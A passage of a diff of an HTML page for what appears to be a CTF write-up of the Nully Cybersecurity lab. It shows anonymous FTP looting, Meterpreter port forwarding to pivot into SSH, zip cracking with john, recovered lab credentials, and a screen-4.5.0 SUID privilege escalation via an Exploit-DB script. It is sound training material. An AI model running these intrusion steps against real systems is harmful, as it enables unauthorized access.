+     <span class="se">\/</span>  <span class="se">\/</span> <span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>
+                                              
+                                             
+Well <span class="k">done</span>! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
+Now go to the Database server.
+</code></pre></div><p>We get the 2nd flag!</p>
+<h3 id="flag-3" class="relative group">Flag 3 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#flag-3" aria-label="Anchor">#</a></span></h3>
+<p>Inside the web server, we ftp to the database server and do some digging.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@WebServer:/root# ftp 172.17.0.5
+ftp 172.17.0.5
+Connected to 172.17.0.5.
+<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>172.17.0.5:root<span class="o">)</span>: anonymous
+anonymous
+<span class="m">230</span> Login successful.
+Remote system <span class="nb">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+drwxr-xr-x    <span class="m">3</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 09:35 pub
+<span class="m">226</span> Directory send OK.
+ftp&gt; <span class="nb">cd</span> pub
+<span class="nb">cd</span> pub
+<span class="m">250</span> Directory successfully changed.
+ftp&gt; ls
+ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+-rw-r--r--    <span class="m">1</span> ftp      ftp             <span class="m">0</span> Aug <span class="m">27</span> 09:35 <span class="nb">test</span>
+<span class="m">226</span> Directory send OK.
+ftp&gt; ls -al
+ls -al
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+drwxr-xr-x    <span class="m">3</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 09:35 .
+drwxr-xr-x    <span class="m">3</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 08:34 ..
+drwxr-xr-x    <span class="m">2</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 14:44 .folder
+-rw-r--r--    <span class="m">1</span> ftp      ftp             <span class="m">0</span> Aug <span class="m">27</span> 09:35 <span class="nb">test</span>
+<span class="m">226</span> Directory send OK.
+ftp&gt; mv .folder folder
+mv .folder folder
+?Invalid <span class="nb">command</span>
+ftp&gt; <span class="nb">cd</span> .folder
+<span class="nb">cd</span> .folder
+<span class="m">250</span> Directory successfully changed.
+ftp&gt; ls
+ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">15</span> Aug <span class="m">27</span> 09:07 file.txt
+<span class="m">226</span> Directory send OK.
+ftp&gt; cat file.txt
+ftp&gt; ls -al
+ls -al
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+drwxr-xr-x    <span class="m">2</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 14:44 .
+drwxr-xr-x    <span class="m">3</span> ftp      ftp          <span class="m">4096</span> Aug <span class="m">27</span> 09:35 ..
+-rw-r--r--    <span class="m">1</span> ftp      ftp           <span class="m">224</span> Aug <span class="m">27</span> 09:37 .backup.zip
+-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">15</span> Aug <span class="m">27</span> 09:07 file.txt
+<span class="m">226</span> Directory send OK.
+ftp&gt; get file.txt
+get file.txt
+local: file.txt remote: file.txt
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> file.txt <span class="o">(</span><span class="m">15</span> bytes<span class="o">)</span>.
+<span class="m">226</span> Transfer complete.
+<span class="m">15</span> bytes received in 0.00 secs <span class="o">(</span>92.1285 kB/s<span class="o">)</span>
+ftp&gt; get .backup.zip
+get .backup.zip
+local: .backup.zip remote: .backup.zip
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> .backup.zip <span class="o">(</span><span class="m">224</span> bytes<span class="o">)</span>.
+<span class="m">226</span> Transfer complete.
+<span class="m">224</span> bytes received in 0.00 secs <span class="o">(</span>268.7346 kB/s<span class="o">)</span>
+ftp&gt; <span class="nb">exit</span>
+<span class="nb">exit</span>
+<span class="m">221</span> Goodbye.
+root@WebServer:/root# ls
+ls
+2_flag.txt  file.txt  typescript
+root@WebServer:/root# ls -al
+ls -al
+total <span class="m">60</span>
+drwx------ <span class="m">1</span> root root  <span class="m">4096</span> Sep <span class="m">26</span> 23:01 .
+drwxr-xr-x <span class="m">1</span> root root  <span class="m">4096</span> Aug <span class="m">25</span> 16:08 ..
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">224</span> Sep <span class="m">26</span> 23:01 .backup.zip
+-rw------- <span class="m">1</span> root root     <span class="m">0</span> Sep <span class="m">26</span> 22:02 .bash_history
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">3106</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .bashrc
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">161</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .profile
+-rw-r--r-- <span class="m">1</span> root root     <span class="m">0</span> Aug <span class="m">26</span> 14:20 .selected_editor
+-rwxr-xr-x <span class="m">1</span> root root   <span class="m">215</span> Aug <span class="m">27</span> 14:43 .services
+drwx------ <span class="m">2</span> root root  <span class="m">4096</span> Aug <span class="m">27</span> 09:59 .ssh
+-rw------- <span class="m">1</span> root root <span class="m">10606</span> Aug <span class="m">27</span> 15:05 .viminfo
+-rw-r--r-- <span class="m">1</span> root root   <span class="m">467</span> Aug <span class="m">26</span> 14:03 2_flag.txt
+-rw-r--r-- <span class="m">1</span> root root    <span class="m">15</span> Sep <span class="m">26</span> 23:00 file.txt
+-rw-r--r-- <span class="m">1</span> root root <span class="m">10157</span> Sep <span class="m">26</span> 13:58 typescript
+root@WebServer:/root# cat file.txt
+</code></pre></div><p>We retrieve 2 files, file.txt and .backup.zip. file.txt is a dead end so we look into backup.txt.</p>
+<p>I transferred the backup.zip file to oscar’s directory and used chown to give him permissions to access the file. Then pivoted the traffic on port 22 to our localhost so we can access the ssh server as oscar using his credentials(that we found earlier).</p>
+<pre tabindex="0"><code>meterpreter &gt; portfwd add -l 2022 -p 22 -r 172.17.0.4
+ssh oscar@localhost -p 2022
+oscar@WebServer:~$ ls -al
+total 40
+drwx------ 4 oscar oscar 4096 Sep 26 23:05 .
+drwxr-xr-x 1 root  root  4096 Aug 26 13:38 ..
+-rw------- 1 oscar oscar    0 Sep 26 22:02 .bash_history
+-rw-r--r-- 1 oscar oscar  220 Aug 25 16:11 .bash_logout
+-rw-r--r-- 1 oscar oscar 3771 Aug 25 16:11 .bashrc
+drwx------ 2 oscar oscar 4096 Aug 25 20:09 .cache
+-rw-r--r-- 1 oscar oscar  807 Aug 25 16:11 .profile
+-rw------- 1 oscar oscar 2183 Aug 26 14:25 .viminfo
+-rw-r--r-- 1 oscar oscar  224 Sep 26 23:01 backup.zip
+-r-------- 1 oscar oscar   37 Aug 26 14:25 my_password
+drwx------ 2 oscar oscar 4096 Sep 26 22:57 scripts
+oscar@WebServer:~$
+</code></pre><p>Now that we can access oscar’s account on our local machine, we can use scp to download the zip file and analyse it incase it requires cracking.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">scp -P <span class="m">2022</span> oscar@localhost:/home/oscar/backup.zip 
+</code></pre></div><p>Crack the zip file using zip2john and john</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">zip2john backup.zip &gt; hash.txt  
+john hash.txt
+</code></pre></div><p>
 
 
 
@@ -694,42 +846,66 @@ Now go to the Database server.`</p>
   
 
 </p>
-<p>We get a file called creds.txt which contain credentials
-<code>donald:HBRLoCZ0b9NEgh8vsECS</code></p>
-<p>These belong to the database server</p>
-<p>Forward the traffic on port 22 of the database server to our local machine
-<code>portfwd add -l 3022 -p 22 -r 172.17.0.5</code></p>
-<p>ssh as donald using the credentials obtained.
-`ssh donald@localhost -p 3022<br>
-The authenticity of host '[localhost]:3022 ([127.0.0.1]:3022)' can't be established.<br>
-ECDSA key fingerprint is SHA256:qA12BwczynXyAVDqWazjlkn7mBhxZq3VkJ3Dp0fWy2s.<br>
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>
-Warning: Permanently added '[localhost]:3022' (ECDSA) to the list of known hosts.<br>
-donald@localhost's password:<br>
-Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.15.0-112-generic x86_64)``* Documentation:  <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></p>
-<ul>
-<li>Management:     <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
-<li>Support:        <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a><code>This system has been minimized by removing packages and content that are   not required on a system that users do not log into.</code>To restore this content, you can run the 'unminimize' command.<br>
-Last login: Thu Aug 27 15:13:37 2020 from 172.17.0.1<br>
-donald@DatabaseServer:~$`</li>
-</ul>
-<p><strong>Privilege escalation</strong>
-<code>find / -perm -4000 -exec ls -l {} \; 2&amp;gt;/dev/null   -rwsr-xr-x 1 root root 44784 May 28 08:37 /usr/bin/newgrp   -rwsr-xr-x 1 root root 68208 May 28 08:37 /usr/bin/passwd   -rwsr-xr-x 1 root root 67816 Apr  2 17:29 /usr/bin/su   -rwsr-xr-x 1 root root 55528 Apr  2 17:29 /usr/bin/mount   -rwsr-xr-x 1 root root 85064 May 28 08:37 /usr/bin/chfn   -rwsr-xr-x 1 root root 39144 Apr  2 17:29 /usr/bin/umount   -rwsr-xr-x 1 root root 53040 May 28 08:37 /usr/bin/chsh   -rwsr-xr-x 1 root root 88464 May 28 08:37 /usr/bin/gpasswd   -rwsr-xr-x 1 root root 1860280 Aug 27 09:50 /usr/bin/screen-4.5.0   -rwsr-xr-- 1 root messagebus 51344 Jun 11 20:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper   -rwsr-xr-x 1 root root 473576 May 29 09:37 /usr/lib/openssh/ssh-keysign   donald@DatabaseServer:~$</code></p>
-<p>This binary stands out
-<code>/usr/bin/screen-4.5.0</code></p>
-<p>Doing a little googling leads as to a script from exploit db, save the script on the system mark it as executable using chmod and execute it
-<code>donald@DatabaseServer:~$ chmod +x privesc.sh    donald@DatabaseServer:~$ ./privesc.sh</code></p>
-<p>We get root access and cat the flag in the root directory
-`# id<br>
-uid=0(root) gid=0(root) groups=0(root),1000(donald)</p>
-<h1 id="cd-root" class="relative group">cd /root <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#cd-root" aria-label="Anchor">#</a></span></h1>
-<h1 id="ls" class="relative group">ls <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ls" aria-label="Anchor">#</a></span></h1>
-<p>3_flag.txt</p>
-<h1 id="cat-3_flagtxt_--_---_____-------------_-----------_-_" class="relative group">cat 3_flag.txt``_  _   _____             _           _ _ <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#cat-3_flagtxt_--_---_____-------------_-----------_-_" aria-label="Anchor">#</a></span></h1>
-<p><em>| || |</em>|  __ \           | |         | | |<br>
-|_  __  <em>| |<strong>) |</strong></em>   ___ | |_ ___  __| | |<br>
-<em>| || |</em>|  _  // _ \ / _ | __/ _ / _<code> | |   |_  __  _| | \ \ (_) | (_) | ||  __/ (_| |_|   z   |_||_| |_|  \_\___/ \___/ \__\___|\__,_(_)``6cb25d4789cdd7fa1624e6356e0d825b``Congratulations on getting the final flag!    You completed the Nully Cybersecurity CTF.   I will be glad if you leave a feedback.``Twitter [https://twitter.com/laf3r_](https://twitter.com/laf3r_)   Discord laf3r#4754</code></p>
-<p>Happy hacking :)</p>
+<p>We get a file called creds.txt which contain credentials</p>
+<pre tabindex="0"><code>donald:HBRLoCZ0b9NEgh8vsECS
+</code></pre><p>These belong to the database server</p>
+<p>Forward the traffic on port 22 of the database server to our local machine</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">portfwd add -l <span class="m">3022</span> -p <span class="m">22</span> -r 172.17.0.5
+</code></pre></div><p>ssh as donald using the credentials obtained.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh donald@localhost -p <span class="m">3022</span>
+The authenticity of host <span class="s1">&#39;[localhost]:3022 ([127.0.0.1]:3022)&#39;</span> can<span class="s1">&#39;t be established.
+</span><span class="s1">ECDSA key fingerprint is SHA256:qA12BwczynXyAVDqWazjlkn7mBhxZq3VkJ3Dp0fWy2s.
+</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>localhost<span class="o">]</span>:3022<span class="s1">&#39; (ECDSA) to the list of known hosts.
+</span><span class="s1">donald@localhost&#39;</span>s password: 
+Welcome to Ubuntu 20.04.1 LTS <span class="o">(</span>GNU/Linux 4.15.0-112-generic x86_64<span class="o">)</span>
+* Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users <span class="k">do</span> not log into.
+To restore this content, you can run the <span class="s1">&#39;unminimize&#39;</span> command.
+Last login: Thu Aug <span class="m">27</span> 15:13:37 <span class="m">2020</span> from 172.17.0.1
+donald@DatabaseServer:~$
+</code></pre></div><h3 id="privilege-escalation-1" class="relative group">Privilege escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-1" aria-label="Anchor">#</a></span></h3>
+<pre tabindex="0"><code>find / -perm -4000 -exec ls -l {} \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 44784 May 28 08:37 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 68208 May 28 08:37 /usr/bin/passwd
+-rwsr-xr-x 1 root root 67816 Apr  2 17:29 /usr/bin/su
+-rwsr-xr-x 1 root root 55528 Apr  2 17:29 /usr/bin/mount
+-rwsr-xr-x 1 root root 85064 May 28 08:37 /usr/bin/chfn
+-rwsr-xr-x 1 root root 39144 Apr  2 17:29 /usr/bin/umount
+-rwsr-xr-x 1 root root 53040 May 28 08:37 /usr/bin/chsh
+-rwsr-xr-x 1 root root 88464 May 28 08:37 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 1860280 Aug 27 09:50 /usr/bin/screen-4.5.0
+-rwsr-xr-- 1 root messagebus 51344 Jun 11 20:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 473576 May 29 09:37 /usr/lib/openssh/ssh-keysign
+donald@DatabaseServer:~$
+</code></pre><p>This binary stands out</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/screen-4.5.0
+</code></pre></div><p>Doing a little googling leads as to a script from exploit db, save the script on the system mark it as executable using chmod and execute it</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">donald@DatabaseServer:~$ chmod +x privesc.sh   
+donald@DatabaseServer:~$ ./privesc.sh
+</code></pre></div><p>We get root access and cat the flag in the root directory</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>donald<span class="o">)</span>
+<span class="c1"># cd /root</span>
+<span class="c1"># ls</span>
+3_flag.txt
+<span class="c1"># cat 3_flag.txt</span>
+_  _   _____             _           _ _ 
+  _<span class="p">|</span> <span class="o">||</span> <span class="p">|</span>_<span class="p">|</span>  __ <span class="se">\ </span>          <span class="p">|</span> <span class="p">|</span>         <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+ <span class="p">|</span>_  __  _<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>___   ___ <span class="p">|</span> <span class="p">|</span>_ ___  __<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+  _<span class="p">|</span> <span class="o">||</span> <span class="p">|</span>_<span class="p">|</span>  _  // _ <span class="se">\ </span>/ _ <span class="se">\|</span> __/ _ <span class="se">\/</span> _<span class="sb">`</span> <span class="p">|</span> <span class="p">|</span>
+ <span class="p">|</span>_  __  _<span class="p">|</span> <span class="p">|</span> <span class="se">\ \ </span><span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="o">||</span>  __/ <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
+z   <span class="p">|</span>_<span class="o">||</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  <span class="se">\_\_</span>__/ <span class="se">\_</span>__/ <span class="se">\_</span>_<span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="o">(</span>_<span class="o">)</span>
+6cb25d4789cdd7fa1624e6356e0d825b
+Congratulations on getting the final flag! 
+You completed the Nully Cybersecurity CTF.
+I will be glad <span class="k">if</span> you leave a feedback.
+Twitter https://twitter.com/laf3r_
+Discord laf3r#4754
+</code></pre></div><p>Happy hacking :)</p>
 
       </div>
     </section>
@@ -823,7 +999,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(donald)</p>
       <div
   id="search-wrapper"
   class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
-  data-url="https://trevorsaudi.github.io/"
+  data-url="https://trevorsaudi.com/"
 >
   <div
     id="search-modal"
